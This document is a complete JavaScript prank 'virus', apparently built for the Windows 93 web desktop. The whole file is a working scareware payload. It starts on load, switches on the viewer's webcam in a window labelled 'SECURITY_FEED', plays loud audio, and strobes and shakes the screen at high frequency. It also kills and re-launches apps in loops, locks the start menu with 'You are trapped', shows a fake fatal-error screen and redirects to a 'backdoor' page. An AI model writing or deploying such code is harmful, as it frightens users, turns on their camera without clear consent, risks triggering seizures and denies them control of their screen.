(function(){
if(typeof window.$alert!=="function"||typeof window.$exe!=="function"){setTimeout(arguments.callee,200);return;}
let userActivated=false;
function startAudio(){
if(userActivated)return;
userActivated=true;
setTimeout(()=>{if(typeof Audio!=="function")return;const a=new Audio("https://www.myinstants.com/media/sounds/virus-song-i-made.mp3");a.volume=1;a.play();},1000);
const AC=window.AudioContext||window.webkitAudioContext;
const ctx=new AC();
ctx.resume();
const node=ctx.createScriptProcessor(1024,0,1);
let t=0;
const speed=5;
node.onaudioprocess=e=>{
const o=e.outputBuffer.getChannelData(0);
for(let i=0;i<o.length;i++){
o[i]=(((t*(t>>11&t>>8))&255)/128)-1;
if(i%speed===0)t++;
}};
node.connect(ctx.destination);
document.removeEventListener("mousemove",startAudio);
document.removeEventListener("keydown",startAudio);
document.removeEventListener("touchstart",startAudio);
}
document.addEventListener("mousemove",startAudio,{once:true});
document.addEventListener("keydown",startAudio,{once:true});
document.addEventListener("touchstart",startAudio,{once:true});

for(let i=0;i<20;i++){try{$exe("mkdir System32")}catch(e){}}

const MS_ICON="https://static.vecteezy.com/system/resources/previews/027/127/473/non_2x/microsoft-logo-microsoft-icon-transparent-free-png.png";
const PERSISTENT_APPS=[];
const OTHER_APPS=["pd","glitch","acid","hydra","doctor","/","necronomicoin","skifree","trollbox","hello"];
const ALL_APPS=PERSISTENT_APPS.concat(OTHER_APPS);
let rsodKillInterval=null;

function startAppWatcher(){setInterval(()=>{if(!document.querySelector('.window[title="Glitch"]')){try{$exe("glitch")}catch(e){}}},500)}

function startMirrorEffect(){const w=$window({title:"SECURITY_FEED",width:320,height:240,x:window.innerWidth-350,y:50,html:'<video id="mirrorVideo" autoplay playsinline muted style="width:100%;height:100%;object-fit:cover;filter:grayscale(1) contrast(1.5) brightness(0.8);"></video>'});
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{const i=setInterval(()=>{const v=document.getElementById("mirrorVideo");if(v){v.srcObject=s;clearInterval(i)}},50)}).catch(()=>{$notif("ERROR: Camera access denied.",3000)})}

function triggerRSOD(){
try{$exe("volume 0");$notif("Audio Output Muted.",3000)}catch(e){}
rsodKillInterval=setInterval(()=>{try{$exe("killall")}catch(e){}},500);
const r=document.createElement("div");
r.style.cssText="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#990000;color:white;z-index:999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Terminal,monospace;text-align:center;padding:20px;line-height:1.5;cursor:pointer;";
r.innerHTML="<p>A fatal exception has occurred at address 0xDEADBEEF in system process win93.exe.</p><p>Your operating system has halted due to a critical error.</p><p>ERROR CODE: 0x00000069 (CORRUPTED_SYSTEM_FILE)</p><p>Module: 7UR8IO_KERNEL.SYS</p><p>Please contact technical support for assistance.</p><p>Press ESC to reboot the system. (Or click anywhere to escape)</p>";
r.onclick=()=>{clearInterval(rsodKillInterval);window.location.href="https://www.windows93.net/backdoor.html"};
document.body.appendChild(r);
document.onkeydown=e=>{if(e.key==="Escape"||e.keyCode===27){e.preventDefault();r.remove();document.onkeydown=null;clearInterval(rsodKillInterval);$alert("Reboot simulation complete.")}}}

function startTextShake(){const t=document.querySelectorAll(".window,.alert,.button,p,span,h1,h2,h3,h4,a,body");
setInterval(()=>{const x=Math.floor(Math.random()*4)-2;const y=Math.floor(Math.random()*4)-2;
const s=x+"px "+y+"px 0px rgba(255,0,0,.7),"+(-x)+"px "+(-y)+"px 0px rgba(120,0,0,.7)";
t.forEach(e=>{e.style.textShadow=s})},70)}

function startPixelMelt(){const m=document.createElement("div");
m.style.cssText="position:fixed;bottom:0;left:0;width:100vw;height:30vh;pointer-events:none;z-index:999998;backdrop-filter:blur(3px) contrast(1.4);";
document.body.appendChild(m)}

function startCurse(){setInterval(()=>{document.querySelectorAll(".window,.alert").forEach(w=>{
const s=window.getComputedStyle(w);const x=parseFloat(s.left)||0;const y=parseFloat(s.top)||0;
w.style.left=x+(Math.floor(Math.random()*3)-1)+"px";
w.style.top=y+(Math.floor(Math.random()*3)-1)+"px"})},80);
setTimeout(startUltimateBreakage,5000)}

function startUltimateBreakage(){
setTimeout(triggerRSOD,100000);
startTextShake();
startPixelMelt();
const i=document.createElement("div");
i.style.cssText="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:999999;";
document.body.appendChild(i);
setInterval(()=>{i.style.display=i.style.display==="none"?"block":"none";i.style.background="white";i.style.mixBlendMode="difference"},150);
setInterval(()=>{ALL_APPS.forEach(a=>{try{$exe(a)}catch(e){}})},15000)}

function startChaosSequence(){
try{$exe("glitch");$exe("doctor");$exe("/")}catch(e){}
startAppWatcher();
startMirrorEffect();
startCurse();
$alert({title:"WINDOWS 93 SECURITY",icon:MS_ICON,msg:"⚠ MALICIOUS PROGRAM DETECTED ⚠\n\nThe program '7UR8IO.exe' has been identified as malicious.\n\nStatus: ACTIVE\nThreat Level: CRITICAL",center:true})}

function lockStartMenu(){const b=document.querySelector(".start-menu-button");
if(b){const n=b.cloneNode(true);b.parentNode.replaceChild(n,b);
n.addEventListener("click",e=>{e.preventDefault();$alert({title:"SYSTEM LOCKED",msg:"You are trapped.",center:true})})}}

startChaosSequence();
lockStartMenu();
})();
